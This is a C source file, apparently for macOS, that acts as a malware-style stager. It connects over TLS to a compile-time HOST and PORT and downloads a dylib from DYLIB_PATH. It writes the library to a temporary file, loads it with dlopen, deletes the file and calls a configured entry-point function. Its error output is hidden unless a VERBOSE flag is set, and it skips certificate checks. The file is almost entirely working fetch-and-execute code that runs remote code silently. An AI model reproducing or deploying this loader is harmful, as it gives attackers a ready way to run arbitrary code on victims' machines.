#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <signal.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#define BUFFER_SIZE 4096

#ifdef VERBOSE
    #define DEBUG_PRINT(fmt, ...) \
        do { \
            fprintf(stdout, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
        } while (0)
    #define DEBUG_FPRINTF(stream, fmt, ...) \
        do { \
            fprintf(stream, "DEBUG: " fmt "\n", ##__VA_ARGS__); \
        } while (0)
#else
    #define DEBUG_PRINT(fmt, ...) \
        do { } while (0)
    #define DEBUG_FPRINTF(stream, fmt, ...) \
        do { } while (0)
#endif

struct Memory {
    char *data;
    size_t size;
};

struct Memory global_mem = {0};

void cleanup(int signum) {
    if (global_mem.data) {
        free(global_mem.data);
    }
    exit(signum);
}

void setup_signal_handlers() {
    struct sigaction sa;
    sa.sa_handler = cleanup;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    sigaction(SIGINT, &sa, NULL);  // Handle Ctrl+C
    sigaction(SIGTERM, &sa, NULL); // Handle termination signal
}

int create_socket(const char *hostname, int port) {
    struct hostent *server;
    struct sockaddr_in server_addr;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        #ifdef VERBOSE
        perror("Error opening socket");
        #endif
        exit(1);
    }

    server = gethostbyname(hostname);
    if (!server) {
        DEBUG_FPRINTF(stderr, "Error, no such host\n");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        #ifdef VERBOSE
        perror("Error connecting to server");
        #endif
        exit(1);
    }

    return sockfd;
}

// void send_http_get_request(int sockfd, const char *hostname, const char *path) {
//     char request[1024];
//     snprintf(request, sizeof(request),
//              "GET %s HTTP/1.1\r\n"
//              "Host: %s\r\n"
//              "Connection: close\r\n\r\n",
//              path, hostname);
//     send(sockfd, request, strlen(request), 0);
// }

void send_ssl_get_request(SSL *ssl, const char *hostname, const char *path) {
    char request[1024];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             path, hostname);
    SSL_write(ssl, request, strlen(request));
}

struct Memory download_dylib(const char *hostname, const char *path, SSL* ssl) {
    struct Memory mem = {0};

    char buffer[BUFFER_SIZE];
    ssize_t bytes_read;

    int header_parsed = 0;

    // while ((bytes_read = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
    while ((bytes_read = SSL_read(ssl, buffer, sizeof(buffer))) > 0) {
        if (!header_parsed) {
            char *header_end = strstr(buffer, "\r\n\r\n");
            if (header_end) {
                size_t header_size = header_end - buffer + 4;
                size_t content_size = bytes_read - header_size;

                mem.data = malloc(content_size);
                if (!mem.data) {
                    #ifdef VERBOSE
                    perror("malloc failed");
                    #endif
                    exit(1);
                }
                memcpy(mem.data, header_end + 4, content_size);
                mem.size = content_size;

                header_parsed = 1;
            }
        } else {
            mem.data = realloc(mem.data, mem.size + bytes_read);
            if (!mem.data) {
                #ifdef VERBOSE
                perror("realloc failed");
                #endif
                exit(1);
            }
            memcpy(mem.data + mem.size, buffer, bytes_read);
            mem.size += bytes_read;
        }
    }

    if (bytes_read < 0) {
        #ifdef VERBOSE
        perror("recv failed");
        #endif
    }

    return mem;
}

void *load_dylib_from_memory(struct Memory *mem) {
    void *mem_fd = mmap(NULL, mem->size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem_fd == MAP_FAILED) {
        #ifdef VERBOSE
        perror("mmap failed");
        #endif
        return NULL;
    }

    memcpy(mem_fd, mem->data, mem->size);

    if (mprotect(mem_fd, mem->size, PROT_READ | PROT_EXEC) == -1) {
        #ifdef VERBOSE
        perror("mprotect failed");
        #endif
        return NULL;
    }


    char temp_filename[] = TMP_FILENAME;
    int fd = mkstemp(temp_filename);
    if (fd == -1) {
        DEBUG_FPRINTF(stderr, "Failed to create temporary file descriptor\n");
        return NULL;
    }

    write(fd, mem->data, mem->size);
    lseek(fd, 0, SEEK_SET);

    void *handle = dlopen(temp_filename, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        DEBUG_FPRINTF(stderr, "dlopen failed: %s\n", dlerror());
    }

    close(fd);
    unlink(temp_filename);

    return handle;
}

int main() {
    setup_signal_handlers();

    const char *hostname = HOST;
    const char *path = DYLIB_PATH;
    int port = PORT;
    int sockfd = create_socket(hostname, port);

    // OpenSSL is gross, thanks https://github.com/angstyloop/c-web/blob/main/openssl-fetch-example.c
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();
    SSL_load_error_strings();

    BIO* certbio = BIO_new(BIO_s_file());
    BIO* outbio = BIO_new_fp(stdout, BIO_NOCLOSE);

    if (SSL_library_init() < 0) {
        #ifdef VERBOSE
        BIO_printf(outbio, "Could not initialize the OpenSSL library !\n");
        #endif
    }

    const SSL_METHOD* method = TLS_client_method();

    SSL_CTX* ctx = SSL_CTX_new(method);
    if (!ctx) {
        #ifdef VERBOSE
        BIO_printf(outbio, "Unable to create a new SSL context.\n");
        #endif
    }

    SSL* ssl = SSL_new(ctx);
    if (!ssl) {
        #ifdef VERBOSE
        BIO_printf(outbio, "Unable to create a new SSL structure.\n");
        #endif
    }

    SSL_set_fd(ssl, sockfd);
    if (SSL_connect(ssl) != 1) {
        #ifdef VERBOSE
        BIO_printf(outbio, "Error: Could not connect the SSL object with a file descriptor\n");
        #endif
    }

    if (SSL_connect(ssl) < 1) {
        #ifdef VERBOSE
        BIO_printf(outbio, "Error: Could not build a SSL session to: %s.\n", hostname);
        #endif
    } else {
        #ifdef VERBOSE
        const char *version = SSL_get_version(ssl);
        BIO_printf(outbio, "Successfully enabled %s session to: %s.\n", version, hostname);
        #endif
    }

    DEBUG_PRINT("Downloading dylib from https://%s:%d%s...", hostname, port, path);
    send_ssl_get_request(ssl, hostname, path);
    struct Memory mem = download_dylib(hostname, path, ssl);
    if (mem.data == NULL || mem.size == 0) {
        DEBUG_FPRINTF(stderr, "Failed to download the dylib\n");
        return 1;
    }

    DEBUG_PRINT("Downloaded %lu bytes", mem.size);

    void *handle = load_dylib_from_memory(&mem);
    if (!handle) {
        DEBUG_FPRINTF(stderr, "Failed to load dylib from memory\n");
        free(mem.data);
        return 1;
    }

    void (*ENTRY_POINT_FUNC)() = dlsym(handle, ENTRY_POINT);
    if (!ENTRY_POINT_FUNC) {
        DEBUG_FPRINTF(stderr, "dlsym failed: %s\n", dlerror());
    } else {
        DEBUG_PRINT("Calling the function \"%s\" from the dylib...", ENTRY_POINT);
        ENTRY_POINT_FUNC();
    }


    SSL_free(ssl);
    SSL_CTX_free(ctx);
    BIO_free_all(certbio);
    BIO_free(outbio);
    close(sockfd);
    dlclose(handle);
    free(mem.data);
    return 0;
}
